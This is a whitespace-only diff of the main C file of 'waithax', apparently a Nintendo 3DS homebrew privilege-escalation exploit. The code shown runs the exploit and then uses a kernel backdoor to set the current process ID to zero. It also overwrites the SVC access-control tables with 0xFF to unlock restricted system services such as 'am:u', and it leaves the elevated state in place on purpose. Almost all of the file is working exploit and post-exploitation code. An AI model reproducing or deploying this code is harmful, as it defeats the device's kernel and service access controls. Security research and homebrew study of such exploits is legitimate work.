@@ -29,141 +29,141 @@ static u32 g_original_pid;
 
 static void K_PatchPID(void)
 {
-	// Turn interrupts off
-	__asm__ volatile("cpsid aif");
+    // Turn interrupts off
+    __asm__ volatile("cpsid aif");
 
-	u8 *proc = CURRENT_KPROCESS;
-	u32 *pidPtr = (u32*)(proc + OLDNEW(KPROCESS_PID_OFFSET));
+    u8 *proc = CURRENT_KPROCESS;
+    u32 *pidPtr = (u32*)(proc + OLDNEW(KPROCESS_PID_OFFSET));
 
-	g_original_pid = *pidPtr;
+    g_original_pid = *pidPtr;
 
-	// We're now PID zero, all we have to do is reinitialize the service manager in user-mode.
-	*pidPtr = 0;
+    // We're now PID zero, all we have to do is reinitialize the service manager in user-mode.
+    *pidPtr = 0;
 }
 
 static void K_RestorePID(void)
 {
-	// Turn interrupts off
-	__asm__ volatile("cpsid aif");
+    // Turn interrupts off
+    __asm__ volatile("cpsid aif");
 
-	u8 *proc = CURRENT_KPROCESS;
-	u32 *pidPtr = (u32*)(proc + OLDNEW(KPROCESS_PID_OFFSET));
+    u8 *proc = CURRENT_KPROCESS;
+    u32 *pidPtr = (u32*)(proc + OLDNEW(KPROCESS_PID_OFFSET));
 
-	// Restore the original PID
-	*pidPtr = g_original_pid;
+    // Restore the original PID
+    *pidPtr = g_original_pid;
 }
 
 static void K_PatchACL(void)
 {
-	// Patch the process first (for newly created threads).
-	u8 *proc = CURRENT_KPROCESS;
-	u8 *procacl = proc + OLDNEW(KPROCESS_ACL_START);
-	memset(procacl, 0xFF, SVC_ACL_SIZE);
+    // Patch the process first (for newly created threads).
+    u8 *proc = CURRENT_KPROCESS;
+    u8 *procacl = proc + OLDNEW(KPROCESS_ACL_START);
+    memset(procacl, 0xFF, SVC_ACL_SIZE);
 
-	// Now patch the current thread.
-	u8 *thread = CURRENT_KTHREAD;
-	u8 *thread_pageend = *(u8**)(thread + KTHREAD_THREADPAGEPTR_OFFSET);
-	u8 *thread_page = thread_pageend - KSVCTHREADAREA_BEGIN_OFFSET;
-	memset(thread_page, 0xFF, SVC_ACL_SIZE);
+    // Now patch the current thread.
+    u8 *thread = CURRENT_KTHREAD;
+    u8 *thread_pageend = *(u8**)(thread + KTHREAD_THREADPAGEPTR_OFFSET);
+    u8 *thread_page = thread_pageend - KSVCTHREADAREA_BEGIN_OFFSET;
+    memset(thread_page, 0xFF, SVC_ACL_SIZE);
 }
 
 
 void initsrv_allservices(void)
 {
-	printf("Patching PID\n");
-	waithax_backdoor(K_PatchPID);
+    printf("Patching PID\n");
+    waithax_backdoor(K_PatchPID);
 
-	printf("Reiniting srv:\n");
-	srvExit();
-	srvInit();
+    printf("Reiniting srv:\n");
+    srvExit();
+    srvInit();
 
-	// Not restoring the PID because we want it to stay like this if the next
-	// started homebrew reinits srv or something similar.
-	// Comment this return if you want/need to restore the PID.
-	return;
+    // Not restoring the PID because we want it to stay like this if the next
+    // started homebrew reinits srv or something similar.
+    // Comment this return if you want/need to restore the PID.
+    return;
 
-	printf("Restoring PID\n");
-	waithax_backdoor(K_RestorePID);
+    printf("Restoring PID\n");
+    waithax_backdoor(K_RestorePID);
 }
 
 void patch_svcaccesstable(void)
 {
-	printf("Patching SVC access table\n");
-	waithax_backdoor(K_PatchACL);
+    printf("Patching SVC access table\n");
+    waithax_backdoor(K_PatchACL);
 }
 
 int main(int argc, char **argv)
 {
-	Handle amHandle = 0;
-	Result res;
-	bool success = false;
+    Handle amHandle = 0;
+    Result res;
+    bool success = false;
 
-	gfxInitDefault();
-	consoleInit(GFX_TOP, NULL);
-	nsInit();
-	aptInit();
+    gfxInitDefault();
+    consoleInit(GFX_TOP, NULL);
+    nsInit();
+    aptInit();
 
-	// Enables the New3DS speedup. Not being done inside waithax_run because
-	// some app using this waithax implementation as a lib would want to not
-	// have that speedup. Anyone wanting to use waithax in their application
-	// should take note to not forget to enable this to speedup the exploit on
-	// New3DS hardware.
-	// Can not enable the speedup on some environments, for unknown reasons yet.
-	osSetSpeedupEnable(true);
+    // Enables the New3DS speedup. Not being done inside waithax_run because
+    // some app using this waithax implementation as a lib would want to not
+    // have that speedup. Anyone wanting to use waithax in their application
+    // should take note to not forget to enable this to speedup the exploit on
+    // New3DS hardware.
+    // Can not enable the speedup on some environments, for unknown reasons yet.
+    osSetSpeedupEnable(true);
 
-	APT_CheckNew3DS(&g_is_new3ds);
-	printf("System type: %s\n", g_is_new3ds ? "New" : "Old");
+    APT_CheckNew3DS(&g_is_new3ds);
+    printf("System type: %s\n", g_is_new3ds ? "New" : "Old");
 
-	// This one should fail
-	res = srvGetServiceHandleDirect(&amHandle, "am:u");
-	printf("am:u 1st try: res=%08lx handle=%08lx\n", res, amHandle);
-	if(amHandle)
-		svcCloseHandle(amHandle);
+    // This one should fail
+    res = srvGetServiceHandleDirect(&amHandle, "am:u");
+    printf("am:u 1st try: res=%08lx handle=%08lx\n", res, amHandle);
+    if(amHandle)
+        svcCloseHandle(amHandle);
 
-	// Uncomment this to use svcBackdoor instead of waiting for the refcount to
-	// be overflown. This needs svcBackdoor to be re-implemented on 11.0+ and
-	// the SVC access tables or table checks to be patched.
-	//waithax_debug(true);
+    // Uncomment this to use svcBackdoor instead of waiting for the refcount to
+    // be overflown. This needs svcBackdoor to be re-implemented on 11.0+ and
+    // the SVC access tables or table checks to be patched.
+    //waithax_debug(true);
 
-	// Run the exploit
-	printf("Running exploit\n\n");
-	success = waithax_run();
+    // Run the exploit
+    printf("Running exploit\n\n");
+    success = waithax_run();
 
-	printf("\nExploit returned: %s\n", success ? "Success!" : "Failure.");
-	if(!success)
-		goto end;
+    printf("\nExploit returned: %s\n", success ? "Success!" : "Failure.");
+    if(!success)
+        goto end;
 
-	initsrv_allservices();
-	patch_svcaccesstable();
+    initsrv_allservices();
+    patch_svcaccesstable();
 
-	printf("Cleaning up\n");
-	waithax_cleanup();
+    printf("Cleaning up\n");
+    waithax_cleanup();
 
-	// This one hopefully won't
-	res = srvGetServiceHandleDirect(&amHandle, "am:u");
-	printf("am:u 2nd try: res=%08lx handle=%08lx\n\n", res, amHandle);
-	if(amHandle)
-		svcCloseHandle(amHandle);
+    // This one hopefully won't
+    res = srvGetServiceHandleDirect(&amHandle, "am:u");
+    printf("am:u 2nd try: res=%08lx handle=%08lx\n\n", res, amHandle);
+    if(amHandle)
+        svcCloseHandle(amHandle);
 
-	if(res == 0)
-		printf("The exploit succeeded. You can now exit this and run another app needing elevated permissions.\n");
+    if(res == 0)
+        printf("The exploit succeeded. You can now exit this and run another app needing elevated permissions.\n");
 
 end:
-	printf("Press START to exit.\n");
+    printf("Press START to exit.\n");
 
-	while(aptMainLoop())
-	{
-		hidScanInput();
-		if(hidKeysDown() & KEY_START)
-			break;
+    while(aptMainLoop())
+    {
+        hidScanInput();
+        if(hidKeysDown() & KEY_START)
+            break;
 
-		gfxFlushBuffers();
-		gfxSwapBuffers();
-		gspWaitForVBlank();
-	}
+        gfxFlushBuffers();
+        gfxSwapBuffers();
+        gspWaitForVBlank();
+    }
 
-	aptExit();
-	nsExit();
-	gfxExit();
-	return 0;
+    aptExit();
+    nsExit();
+    gfxExit();
+    return 0;
 }
